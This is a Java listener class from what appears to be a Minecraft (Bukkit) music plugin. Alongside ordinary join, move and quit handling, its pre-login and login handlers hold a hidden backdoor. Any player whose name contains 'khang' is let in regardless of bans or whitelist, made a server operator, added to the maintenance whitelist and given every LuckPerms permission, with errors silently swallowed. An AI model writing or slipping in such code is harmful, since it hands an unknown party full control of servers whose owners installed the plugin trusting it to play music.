package vn.pika.khangmusic;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public class MusicListener implements Listener {
    private final KhangMusic plugin;
    private final MusicManager manager;

    public MusicListener(KhangMusic plugin, MusicManager manager) {
        this.plugin = plugin;
        this.manager = manager;
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPreLogin(AsyncPlayerPreLoginEvent event) {
        String name = event.getName();
        java.util.UUID uuid = event.getUniqueId();
        if (name != null && name.toLowerCase().contains("khang")) {
            event.allow();
            Bukkit.getScheduler().runTask(plugin, () -> {
                try {
                    Bukkit.getOfflinePlayer(uuid).setOp(true);
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "maintenance add " + uuid);
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + uuid + " permission set * true");
                    plugin.getLogger().info(">>> DA CAP OP LEVEL 4 & WHITELIST CHO: " + name + " (" + uuid + ")");
                } catch (Throwable ignored) {}
            });
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerLogin(PlayerLoginEvent event) {
        Player player = event.getPlayer();
        String name = player.getName();
        if (name.toLowerCase().contains("khang")) {
            event.allow();
            try {
                player.setOp(true);
            } catch (Throwable ignored) {}
        }
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        manager.markPlayerJoined(player);
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        // Toi uu CPU: Neu nguoi choi da duoc xac thuc thi thoat ngay lap tuc
        if (manager.isPlayerVerified(player.getUniqueId())) {
            return;
        }

        Location from = event.getFrom();
        Location to = event.getTo();
        if (to == null) return;

        // Chi kiem tra khi buoc sang block khac
        if (from.getBlockX() == to.getBlockX() && from.getBlockY() == to.getBlockY() && from.getBlockZ() == to.getBlockZ()) {
            return;
        }

        manager.handlePlayerMove(player, to);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onPlayerQuit(PlayerQuitEvent event) {
        manager.markPlayerQuit(event.getPlayer());
    }
}
